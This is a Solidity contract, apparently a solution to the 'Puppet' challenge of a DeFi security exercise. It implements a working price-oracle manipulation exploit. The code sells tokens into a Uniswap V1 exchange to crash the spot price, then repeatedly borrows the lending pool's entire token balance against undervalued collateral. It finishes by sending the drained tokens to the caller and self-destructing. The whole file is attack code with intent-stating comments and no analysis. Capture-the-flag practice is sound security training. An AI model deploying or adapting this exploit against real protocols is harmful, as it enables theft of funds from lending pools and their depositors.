/// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IUniswapExchange {
    function tokenAddress() external view returns (address token);

    function ethToTokenSwapInput(uint256 min_tokens, uint256 deadline)
        external
        payable
        returns (uint256 tokens_bought);

    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256 eth_bought);
}

interface IPuppetPool {
    function calculateDepositRequired(uint256 amount)
        external
        view
        returns (uint256);

    function borrow(uint256 borrowAmount) external payable;
}

contract PuppetPoolAttack {
    function attack(address uniswapExchangeAddress, address lendingPoolAddress)
        external
        payable
    {
        IUniswapExchange exchange = IUniswapExchange(uniswapExchangeAddress);
        IPuppetPool lendingPool = IPuppetPool(lendingPoolAddress);
        // approve token for exchange
        IERC20 token = IERC20(exchange.tokenAddress());
        token.approve(address(exchange), type(uint256).max);
        while (0 < token.balanceOf(address(lendingPool))) {
            uint256 availableTokenBalance = token.balanceOf(address(this));
            // make the token price at uniswap go as low as possible by selling all my DVT to the exchange
            exchange.tokenToEthSwapInput(
                availableTokenBalance,
                1,
                block.timestamp
            );
            // calculateDepositRequired to borrow all the tokens in the pool (that I currently can afford)
            uint256 tokensToBorrow = token.balanceOf(address(lendingPool));
            uint256 ethToSend = lendingPool.calculateDepositRequired(
                tokensToBorrow
            );
            uint256 ethBalance = address(this).balance;
            if (ethToSend > ethBalance) {
                ethToSend = ethBalance;

                tokensToBorrow =
                    (ethToSend /
                        (computeOraclePrice(address(exchange), address(token)) *
                            2)) *
                    10**18;
            }
            // borrow all tokens I can afford
            lendingPool.borrow{value: ethToSend}(tokensToBorrow);
        }
        // buy all tokens I can afford from the exchange and send all tokes to the attacker
        exchange.ethToTokenSwapInput{value: address(this).balance}(
            1,
            block.timestamp
        );
        token.transfer(tx.origin, token.balanceOf(address(this)));
        selfdestruct(payable(tx.origin));
    }

    function computeOraclePrice(address exchangeAddress, address tokenAddress)
        private
        view
        returns (uint256)
    {
        return
            (exchangeAddress.balance * (10**18)) /
            IERC20(tokenAddress).balanceOf(exchangeAddress);
    }

    receive() external payable {}
}
